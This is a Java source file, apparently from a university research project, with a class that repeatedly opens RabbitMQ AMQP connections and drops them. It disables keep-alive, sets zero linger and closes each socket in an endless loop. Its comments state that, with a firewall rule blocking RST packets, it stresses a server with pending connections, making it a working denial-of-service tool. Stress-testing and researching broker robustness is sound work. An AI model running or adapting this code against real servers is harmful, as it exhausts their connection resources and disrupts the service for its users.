package de.htwk_leipzig.bis.connection.dropconnection;

import java.io.IOException;
import java.net.Socket;
import java.net.URI;

import com.rabbitmq.client.Connection;
import com.rabbitmq.client.ConnectionFactory;
import com.rabbitmq.client.SocketConfigurator;

import de.htwk_leipzig.bis.util.ToolBox;

/**
 * This class represents a AMQ Client which open a AMQ Connection, extract the
 * TCP socket, disable keep-alive, enable SO_LINGER and finally close the
 * socket. In combination with a firewall rule to block the RST-package, it
 * could be use to stress a server with a lot of pending connections.
 * <p>
 * It implements {@code Runnable} to allow running in a {@code Thread}.
 */
public class ConnectionDropping implements Runnable {

    /**
     * Member variable to hold the RabbitMQ-Server URI.
     */
    private final URI mUri;

    /**
     * Member variable to hold the delay between the drop-connect-sequence.
     */
    private final int mCreationDelay;

    /**
     * Member variable to hold the currently used socket.
     */
    private Socket mCurrentSocket;

    /**
     * Creates a new instance of {@code ConnectionDropping} with the give uri
     * and the given interval between the drop of a connection and the start of
     * the next connection.
     * 
     * @param uri
     *            The uri of the RabbitMQ-Server.
     * @param creationDelay
     *            Delay between the drop and connect to new socket.
     */
    public ConnectionDropping(final URI uri, final int creationDelay) {
	mUri = uri;
	mCreationDelay = creationDelay;
    }

    /*
     * (non-Javadoc)
     * 
     * @see java.lang.Runnable#run()
     */
    @Override
    public void run() {
	try {
	    final ConnectionFactory factory = ToolBox.createConnectionFactory(mUri);
	    factory.setUri(mUri);
	    factory.setRequestedHeartbeat(Integer.MAX_VALUE);
	    factory.setSocketConfigurator(new SocketConfigurator() {
		@Override
		public void configure(Socket socket) throws IOException {
		    socket.setKeepAlive(false);
		    socket.setSoLinger(true, 0);
		    mCurrentSocket = socket;
		}
	    });
	    do {
		final Connection connection = factory.newConnection();

		/*
		 * RST packages must be blocked by firewall
		 */
		mCurrentSocket.close();
		Thread.sleep(mCreationDelay);
	    } while (true);
	} catch (Exception e) {
	    e.printStackTrace();
	}
    }
}
